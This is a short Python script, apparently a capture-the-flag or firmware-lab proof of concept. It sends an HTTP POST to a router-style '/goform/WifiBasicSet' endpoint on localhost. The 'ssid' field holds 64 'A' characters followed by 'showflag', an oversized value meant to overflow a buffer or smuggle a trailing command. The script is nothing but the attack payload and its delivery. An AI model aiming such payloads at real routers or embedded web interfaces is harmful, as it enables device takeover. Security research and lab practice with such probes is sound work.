#!/usr/bin/env python3
import requests

url = "http://127.0.0.1:8080/goform/WifiBasicSet"
payload = {
    "ssid": "A" * 64 + "showflag",
    "channel": "11",
    "password": "12345678",
}

resp = requests.post(url, data=payload, timeout=5)
print(resp.text)
